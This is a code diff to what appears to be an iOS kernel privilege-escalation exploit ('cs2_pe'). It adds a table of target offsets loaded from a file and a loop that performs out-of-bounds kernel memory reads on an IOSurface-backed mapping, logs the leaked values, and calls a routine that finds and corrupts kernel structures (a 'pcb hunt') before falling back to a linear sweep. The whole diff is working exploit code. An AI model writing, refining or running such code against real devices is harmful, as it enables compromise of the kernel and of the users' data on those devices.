@@ -17,6 +17,11 @@
 cs2_offsets_t cs2_offsets;
 cs2_context_t cs2_ctx;
 
+/* LSWARM-TARGET: filled by the ObjC runner from Documents/lightsword_wrong.txt
+   before cs2_run() (see cs2/common.h note). */
+uint64_t g_lsw_wrong_offs[16];
+int g_lsw_wrong_n = 0;
+
 kern_return_t cs2_pe_init(void) {
     // creates read and write fd
     cs2_init_files();
@@ -194,6 +199,28 @@ kern_return_t cs2_pe_v1(void) {
 
             // create surface at search mapping address with mapping size, calls IOSurfacePrefetchPages ("mlocks" the surface...???)
             cs2_surface_mlock(search_mapping_address, search_mapping_size);
+
+            /* LSWARM-TARGET: probe the calib's PROVEN WRONG windows in THIS
+               mapping first (boot-recurrence law: 0xba0000 recurs across
+               boots, 0x57c0000 x3 same page-id). Receipt line per probe;
+               a hit goes straight to the pcb hunt. Falls through to the
+               unchanged linear sweep with the table logged. */
+            for (int li = 0; li < g_lsw_wrong_n; li++) {
+                size_t lt = (size_t)(g_lsw_wrong_offs[li] & ~((uint64_t)vm_page_size - 1));
+                if (lt >= search_mapping_size) continue;
+                kern_return_t lkr = cs2_oob_read(memory_object, lt, cs2_ctx.oob_size, cs2_ctx.oob_offset, read_buffer);
+                LOG("[lswarm] map=%lu off=0x%zx kr=%#x q0=%016llx q1=%016llx",
+                    s, lt, lkr,
+                    (unsigned long long)((uint64_t *)read_buffer)[0],
+                    (unsigned long long)((uint64_t *)read_buffer)[1]);
+                if (lkr == KERN_SUCCESS &&
+                    cs2_find_and_corrupt(memory_object, lt, read_buffer, write_buffer,
+                                         target_inp_gencnt_list, &target_inp_gencnt_count, false)
+                        == KERN_SUCCESS) {
+                    success = true;
+                }
+            }
+            if (success) break;
 
             // start the party
             uint64_t seeking_offset = 0;
